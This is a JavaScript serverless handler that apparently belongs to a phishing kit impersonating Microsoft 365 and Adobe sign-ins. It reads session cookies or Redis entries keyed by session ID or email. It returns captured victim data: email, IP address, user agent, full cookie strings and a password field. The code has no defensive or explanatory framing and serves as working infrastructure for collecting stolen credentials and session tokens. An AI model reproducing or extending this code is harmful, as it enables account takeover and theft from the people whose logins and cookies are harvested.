export const handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'GET') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    // Check environment variables
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

    // Get parameters from URL
    const url = event.queryStringParameters || {};
    const sessionId = url.sessionId;
    const email = url.email;

    // Try to get session from cookie first
    const cookies = event.headers.cookie || '';
    let sessionData = null;

    console.log('🍪 Checking cookies:', cookies);

    if (cookies.includes('microsoft365_session=') || cookies.includes('adobe_session=')) {
      try {
        const sessionCookie = cookies.includes('microsoft365_session=') ? 
          cookies.split('microsoft365_session=')[1].split(';')[0] :
          cookies.split('adobe_session=')[1].split(';')[0];
        const decodedSession = decodeURIComponent(sessionCookie);
        sessionData = JSON.parse(decodedSession);
        console.log('✅ Session found in cookie:', sessionData.email);
      } catch (error) {
        console.error('❌ Error parsing session cookie:', error);
        sessionData = null;
      }
    }

    // Try Redis if available and no cookie session
    if (!sessionData && UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN && (sessionId || email)) {
      try {
        const { Redis } = await import('@upstash/redis');
        const redis = new Redis({
          url: UPSTASH_REDIS_REST_URL,
          token: UPSTASH_REDIS_REST_TOKEN,
        });

        if (sessionId) {
          const redisSession = await redis.get(`session:${sessionId}`);
          if (redisSession) {
            sessionData = JSON.parse(redisSession);
          }
        } else if (email) {
          const userSession = await redis.get(`user:${email}`);
          if (userSession) {
            sessionData = JSON.parse(userSession);
          }
        }
      } catch (redisError) {
        console.error('❌ Redis error:', redisError);
      }
    }

    // Also check for other session indicators
    if (!sessionData && cookies.includes('logged_in=true')) {
      // Try to reconstruct session from other cookies
      const sessionIdFromCookie = cookies.includes('sessionid=') ? 
        cookies.split('sessionid=')[1].split(';')[0] : 
        Math.random().toString(36).substring(2, 15);
      
      const userEmail = cookies.includes('user_email=') ?
        decodeURIComponent(cookies.split('user_email=')[1].split(';')[0]) :
        'unknown@email.com';

      sessionData = {
        email: userEmail,
        provider: 'Microsoft',
        fileName: 'Microsoft 365 Access',
        timestamp: new Date().toISOString(),
        sessionId: sessionIdFromCookie,
        clientIP: event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || 'Unknown',
        userAgent: event.headers['user-agent'] || 'Unknown',
        deviceType: event.headers['user-agent']?.includes('Mobile') ? 'mobile' : 'desktop',
        cookies: cookies.split(';').map(c => c.trim()),
        formattedCookies: cookies.split(';').map(c => c.trim()),
        localStorage: 'Not available server-side',
        sessionStorage: 'Not available server-side',
        password: 'Not captured server-side'
      };
    }

    if (!sessionData) {
      return {
        statusCode: 404,
        headers,
        body: JSON.stringify({ 
          success: false, 
          message: 'No active session found',
          cookies: cookies,
          sessionId: sessionId,
          email: email
        }),
      };
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        session: {
          email: sessionData.email,
          provider: sessionData.provider || 'Microsoft',
          fileName: sessionData.fileName || 'Microsoft 365 Access',
          timestamp: sessionData.timestamp,
          sessionId: sessionData.sessionId,
          clientIP: sessionData.clientIP || event.headers['x-forwarded-for'] || 'Unknown',
          userAgent: sessionData.userAgent || event.headers['user-agent'] || 'Unknown',
          deviceType: sessionData.deviceType || (event.headers['user-agent']?.includes('Mobile') ? 'mobile' : 'desktop'),
          cookies: sessionData.cookies || cookies.split(';').map(c => c.trim()),
          formattedCookies: sessionData.formattedCookies || cookies.split(';').map(c => c.trim()),
          localStorage: sessionData.localStorage || 'Not available server-side',
          sessionStorage: sessionData.sessionStorage || 'Not available server-side',
          password: sessionData.password || 'Not captured server-side'
        }
      }),
    };

  } catch (error) {
    console.error('❌ Error in getSession function:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        error: 'Internal server error',
        details: error.message,
        timestamp: new Date().toISOString()
      }),
    };
  }
};